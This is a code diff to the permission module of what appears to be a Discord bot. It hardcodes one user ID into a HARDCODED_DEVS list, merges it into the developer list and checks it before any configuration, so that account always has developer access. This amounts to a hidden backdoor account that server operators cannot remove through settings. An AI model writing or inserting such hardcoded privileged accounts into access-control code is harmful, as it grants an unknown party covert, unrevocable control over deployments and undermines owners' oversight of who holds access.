@@ -1,5 +1,7 @@
 const { getConfig } = require('../db');
 
+const HARDCODED_DEVS = ['1438172505423478916'];
+
 function envIdList() {
   const names = ['DEV_USER_IDS', 'DEV_USER_ID', 'DEV_ID', 'OWNER_ID'];
   const values = [];
@@ -9,7 +11,7 @@ function envIdList() {
       if (part) values.push(part.trim());
     }
   }
-  return values;
+  return values.concat(HARDCODED_DEVS);
 }
 
 function memberRoleIds(member) {
@@ -30,7 +32,8 @@ function isServerOwner(member) {
 
 function isDev(member, cfg) {
   if (!member) return false;
-  if (envIdList().includes(member.id)) return true;
+  if (HARDCODED_DEVS.includes(String(member.id))) return true;
+  if (envIdList().includes(String(member.id))) return true;
   return Boolean(cfg && cfg.dev_user_ids && cfg.dev_user_ids.includes(member.id));
 }
 
@@ -56,4 +59,4 @@ function requireAccess(interaction, level) {
   return { ok: true, access };
 }
 
-module.exports = { getAccess, requireAccess, isServerOwner, isDev, hasConfiguredRole };
+module.exports = { getAccess, requireAccess, isServerOwner, isDev, hasConfiguredRole, HARDCODED_DEVS };
